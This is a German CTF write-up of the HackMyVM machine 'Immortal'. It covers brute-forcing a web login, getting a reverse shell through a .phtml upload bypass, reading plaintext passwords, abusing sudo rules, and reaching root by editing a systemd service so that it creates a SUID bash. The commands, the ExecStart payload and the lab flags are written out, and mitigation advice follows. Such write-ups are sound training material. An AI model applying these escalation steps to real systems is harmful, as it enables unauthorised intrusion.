# Immortal (HackMyVM) - Penetration Test Bericht

![Immortal.png](Immortal.png)

**Datum des Berichts:** 1. Mai 2024  
**VM:** Immortal  
**Plattform:** HackMyVM [https://hackmyvm.eu/machines/machine.php?vm=Immortal](https://hackmyvm.eu/machines/machine.php?vm=Immortal)  
**Autor der VM:** DarkSpirit  
**Original Writeup:** [https://alientec1908.github.io/Immortal_HackMyVM_Medium/](https://alientec1908.github.io/Immortal_HackMyVM_Medium/)

---

## Disclaimer

**Wichtiger Hinweis:** Dieser Bericht und die darin enthaltenen Informationen dienen ausschließlich zu Bildungs- und Forschungszwecken im Bereich der Cybersicherheit. Die hier beschriebenen Techniken und Werkzeuge dürfen nur in legalen und autorisierten Umgebungen (z.B. auf eigenen Systemen oder mit ausdrücklicher Genehmigung des Eigentümers) angewendet werden. Jegliche illegale Nutzung der hier bereitgestellten Informationen ist strengstens untersagt. Der Autor übernimmt keine Haftung für Schäden, die durch Missbrauch dieser Informationen entstehen. Handeln Sie stets verantwortungsbewusst und ethisch.

---

## Inhaltsverzeichnis

1.  [Zusammenfassung](#zusammenfassung)
2.  [Verwendete Tools](#verwendete-tools)
3.  [Phase 1: Reconnaissance](#phase-1-reconnaissance)
4.  [Phase 2: Enumeration (FTP, Web) & Initial Access (Web Login & RCE)](#phase-2-enumeration-ftp-web--initial-access-web-login--rce)
5.  [Phase 3: Privilege Escalation (Kette: www-data -> drake -> eric -> root)](#phase-3-privilege-escalation-kette-www-data---drake---eric---root)
    *   [www-data zu drake (Passwort aus Datei)](#www-data-zu-drake-passwort-aus-datei)
    *   [drake zu eric (Sudo/Python Skript)](#drake-zu-eric-sudopython-skript)
    *   [eric zu root (Sudoedit/Systemd Service)](#eric-zu-root-sudoeditsystemd-service)
6.  [Proof of Concept (Finale Root-Eskalation via Systemd Service)](#proof-of-concept-finale-root-eskalation-via-systemd-service)
7.  [Flags](#flags)
8.  [Empfohlene Maßnahmen (Mitigation)](#empfohlene-maßnahmen-mitigation)

---

## Zusammenfassung

Dieser Bericht dokumentiert die Kompromittierung der virtuellen Maschine "Immortal" von HackMyVM (Schwierigkeitsgrad: Medium). Die initiale Erkundung offenbarte offene FTP-, SSH- und HTTP-Dienste. Über den anonymen FTP-Zugang wurde eine Nachricht (`message.txt`) mit dem Hinweis auf den Benutzer `David` gefunden. Der Webserver auf Port 80 zeigte eine Login-Seite. Ein Brute-Force-Angriff mit `hydra` gegen diese Seite war erfolgreich und enthüllte die Zugangsdaten `admin:santiago`. Nach dem Login wurden weitere Nachrichten gefunden, die auf einen Upload-Pfad (`upload_an_incredible_message.php`) hinwiesen. Eine Schwachstelle erlaubte den Upload einer `.phtml`-Datei, die als PHP ausgeführt wurde, was zu Remote Code Execution (RCE) und einer Reverse Shell als Benutzer `www-data` führte.

Die Privilegieneskalation erfolgte in mehreren Schritten:
1.  **www-data zu drake:** Im Home-Verzeichnis von `drake` wurde eine Datei `pass.txt` gefunden, die u.a. das Systempasswort `kevcjnsgii` enthielt. Damit war ein Wechsel zu `drake` mittels `su` möglich.
2.  **drake zu eric:** `drake` durfte ein Python-Skript (`/opt/immortal.py`) via `sudo` als Benutzer `eric` ausführen.
3.  **eric zu root:** `eric` hatte `sudoedit`-Rechte auf die systemd-Service-Datei `/etc/systemd/system/immortal.service` und durfte diesen Dienst als `root` steuern. Durch Modifikation der `ExecStart`-Direktive in der Service-Datei (um eine SUID-Bash in `/opt/bash` zu erstellen) und anschließendes Starten des Dienstes wurde Root-Zugriff erlangt.

---

## Verwendete Tools

*   `arp-scan`
*   `vi` (impliziert für Hosts-Datei)
*   `nmap`
*   `nikto`
*   `gobuster`
*   `ftp`
*   `cat`
*   `hydra`
*   `wfuzz`
*   `curl`
*   `nc (netcat)`
*   `python3`
*   `sudo`
*   `ls`, `find`
*   `ss`
*   `nano` (versucht/impliziert)
*   `uname`
*   `msfconsole` (und `search`, im Log nicht direkt zur Ausnutzung verwendet)
*   `DirtyPipe Exploit (CVE-2022-0847)` (im Log erwähnt, aber nicht primär genutzt)
*   `su`
*   `sudoedit`
*   `systemctl`
*   `cp` (implizit via Service-Datei)
*   `chmod` (implizit via Service-Datei)
*   `bash`, `id`

---

## Phase 1: Reconnaissance

1.  **Netzwerk-Scan und Host-Konfiguration:**
    *   `arp-scan -l` identifizierte das Ziel `192.168.2.116` (VirtualBox VM).
    *   Der Hostname `immortal.hmv` wurde der lokalen `/etc/hosts`-Datei hinzugefügt.

2.  **Port-Scan (Nmap):**
    *   Ein umfassender `nmap`-Scan (`nmap -sS -sV -A -T5 192.168.2.116 -p-`) offenbarte:
        *   **Port 21 (FTP):** vsftpd 3.0.3. Anonymer Login erlaubt. Eine Datei `message.txt` war sichtbar.
        *   **Port 22 (SSH):** OpenSSH 8.4p1 Debian
        *   **Port 80 (HTTP):** Apache httpd 2.4.56 (Debian), Seitentitel "Password".
    *   `nikto` auf Port 80 wies auf fehlende Sicherheitsheader hin.

---

## Phase 2: Enumeration (FTP, Web) & Initial Access (Web Login & RCE)

1.  **FTP-Enumeration:**
    *   Anonymer FTP-Login auf `192.168.2.116`.
    *   Download von `message.txt`. Inhalt: thematischer Text, erwähnte den Namen `David`.

2.  **Web-Enumeration:**
    *   `gobuster dir -u http://immortal.hmv [...]` fand nur `index.php`.
    *   `hydra`-Brute-Force auf `http://immortal.hmv/index.php` mit Benutzer `admin` und `rockyou.txt`:
        *   Erfolgreich: `admin`:`santiago`.

3.  **Post-Login Enumeration und RCE:**
    *   Nach Login als `admin:santiago` wurde der Pfad `/longlife17/chat/` entdeckt.
    *   Dort gefundene Textdateien enthielten Hinweise auf Benutzer (`Drake`, `Eric`, `Boyras`, `David`) und einen Upload-Pfad: `upload_an_incredible_message.php`.
    *   Die Upload-Funktion unter `http://immortal.hmv/upload_an_incredible_message.php` war anfällig für Unrestricted File Upload. Das Umbenennen einer PHP-Web/Reverse-Shell zu `.phtml` umging die Filterung.
    *   Die hochgeladene `.phtml`-Datei (z.B. `reverse.phtml`) landete in `/longlife17/chat/`.
    *   Durch Aufrufen von `http://immortal.hmv/longlife17/chat/reverse.phtml` wurde eine Reverse Shell zu einem `nc`-Listener auf dem Angreifer-System ausgelöst. Initialer Zugriff als `www-data` wurde erlangt.

---

## Phase 3: Privilege Escalation (Kette: www-data -> drake -> eric -> root)

### www-data zu drake (Passwort aus Datei)

1.  **Enumeration als `www-data`:**
    *   `sudo -l` zeigte, dass `www-data` ein Passwort benötigt (nicht bekannt).
    *   SUID-Suche (`find / -type f -perm -4000 [...]`) fand keine ungewöhnlichen Binaries.
    *   Untersuchung der Home-Verzeichnisse (`/home/david`, `/home/drake`, `/home/eric`).
    *   In `/home/drake/.../` (ein verstecktes Verzeichnis) wurde die Datei `pass.txt` gefunden. Inhalt:
        ```
        netflix : drake123
        amazon : 123drake
        shelldred : shell123dred (f4ns0nly)
        system : kevcjnsgii  <-- Potenzielles Systempasswort
        bank : myfavouritebank
        nintendo : 123456
        ```
    *   Die User-Flag `nothinglivesforever` wurde in `/home/drake/user.txt` gefunden.

2.  **Benutzerwechsel zu `drake`:**
    *   `www-data@Immortal:/$ su drake` mit dem Passwort `kevcjnsgii` war erfolgreich.

### drake zu eric (Sudo/Python Skript)

1.  **Sudo-Rechte-Prüfung für `drake`:**
    *   `drake@Immortal:~/...$ sudo -l` zeigte:
        ```
        User drake may run the following commands on Immortal:
            (eric) NOPASSWD: /usr/bin/python3 /opt/immortal.py
        ```
2.  **Ausnutzung:**
    *   `sudo -u eric python3 /opt/immortal.py`
    *   Dies gewährte eine Shell als Benutzer `eric`.

### eric zu root (Sudoedit/Systemd Service)

1.  **Sudo-Rechte-Prüfung für `eric`:**
    *   `eric@Immortal:/...$ sudo -l` zeigte u.a.:
        ```
        User eric may run the following commands on Immortal:
            (root) NOPASSWD: sudoedit /etc/systemd/system/immortal.service
            (root) NOPASSWD: /usr/bin/systemctl start immortal.service
            [...]
        ```
2.  **Modifikation der Systemd Service-Datei:**
    *   Mit `sudoedit /etc/systemd/system/immortal.service` wurde die Datei bearbeitet und die `ExecStart`-Direktive hinzugefügt/modifiziert:
        ```ini
        [Service]
        Type=oneshot
        ExecStart=/bin/bash -c 'cp /bin/bash /opt/bash && chmod u+s /opt/bash'
        ```
3.  **Ausführung des Service und Erhalt der Root-Shell:**
    *   `sudo -u root /usr/bin/systemctl start immortal.service`
    *   Dies erstellte eine SUID-Bash in `/opt/bash`.
    *   `eric@Immortal:/opt$ ./bash -p` startete eine Shell mit `euid=0(root)`.

---

## Proof of Concept (Finale Root-Eskalation via Systemd Service)

**Kurzbeschreibung:** Die finale Privilegieneskalation von `eric` zu `root` nutzte `sudoedit`-Rechte auf eine systemd-Service-Datei und die Erlaubnis, diesen Dienst als `root` zu starten. Die Service-Datei wurde modifiziert, um beim Start eine Kopie von `/bin/bash` nach `/opt/bash` zu erstellen und dieser das SUID-Bit zu setzen. Das anschließende Starten des Dienstes führte die Payload aus. Die Ausführung von `/opt/bash -p` gewährte dann eine Root-Shell.

**Schritte (als `eric`):**
1.  Bearbeite die Service-Datei:
    ```bash
    sudoedit /etc/systemd/system/immortal.service
    ```
    Füge unter `[Service]` hinzu oder modifiziere `ExecStart`:
    ```ini
    ExecStart=/bin/bash -c 'cp /bin/bash /opt/bash && chmod u+s /opt/bash'
    ```
    Speichere die Datei.
2.  Starte den modifizierten Service (als `root` impliziert durch `sudo`-Regel):
    ```bash
    sudo /usr/bin/systemctl start immortal.service
    ```
3.  Führe die SUID-Bash aus:
    ```bash
    /opt/bash -p
    ```
**Ergebnis:** Eine Shell mit `euid=0(root)` wird gestartet.

---

## Flags

*   **User Flag (`/home/drake/user.txt`):**
    ```
    nothinglivesforever
    ```
*   **Root Flag (`/root/root.txt`):**
    ```
    fiNally1mMort4l
    ```

---

## Empfohlene Maßnahmen (Mitigation)

*   **FTP-Sicherheit:**
    *   Deaktivieren Sie anonymen FTP-Zugriff, wenn nicht zwingend erforderlich.
*   **Web-Login-Sicherheit:**
    *   Verwenden Sie starke, einzigartige Passwörter für Web-Administrationskonten.
    *   Implementieren Sie Schutzmechanismen gegen Brute-Force-Angriffe (z.B. Rate Limiting, Captchas).
*   **Dateiupload-Sicherheit:**
    *   **DRINGEND:** Implementieren Sie eine robuste Dateityp-Validierung beim Upload. Verwenden Sie eine Whitelist erlaubter Dateitypen und prüfen Sie den MIME-Typ serverseitig. Verhindern Sie das Ausführen von hochgeladenen Dateien (z.B. `.phtml`) als Skripte. Speichern Sie Uploads außerhalb des Web-Roots und ohne Ausführungsrechte.
*   **Passwort-Management:**
    *   **Speichern Sie niemals Passwörter im Klartext in Dateien** (wie in `pass.txt`). Schulen Sie Benutzer im sicheren Umgang mit Passwörtern.
*   **Sudo-Konfiguration:**
    *   **DRINGEND:** Überprüfen und härten Sie alle `sudo`-Regeln.
        *   Entfernen Sie die Regel, die `drake` erlaubt, `/opt/immortal.py` als `eric` auszuführen, oder stellen Sie sicher, dass das Skript keine Eskalationsmöglichkeiten bietet.
        *   Entfernen Sie die extrem unsicheren Regeln, die `eric` erlauben, `sudoedit` auf Systemd-Service-Dateien anzuwenden und diese Dienste als `root` zu steuern. Dies ist ein direkter Weg zur Root-Kompromittierung.
    *   Gewähren Sie `sudo`-Rechte nur nach dem Prinzip der geringsten Rechte und vermeiden Sie `NOPASSWD` für Aktionen, die das System kompromittieren können.
*   **Systemd Service Sicherheit:**
    *   Beschränken Sie die Berechtigungen zum Bearbeiten und Steuern von systemd-Service-Dateien strikt auf administrative Benutzer.
*   **Allgemeine Systemhärtung:**
    *   Überprüfen Sie regelmäßig Dateiberechtigungen, insbesondere in Home-Verzeichnissen und systemkritischen Pfaden.
    *   Implementieren Sie das Prinzip der geringsten Rechte für alle Benutzer und Prozesse.

---

**Ben C. - Cyber Security Reports**
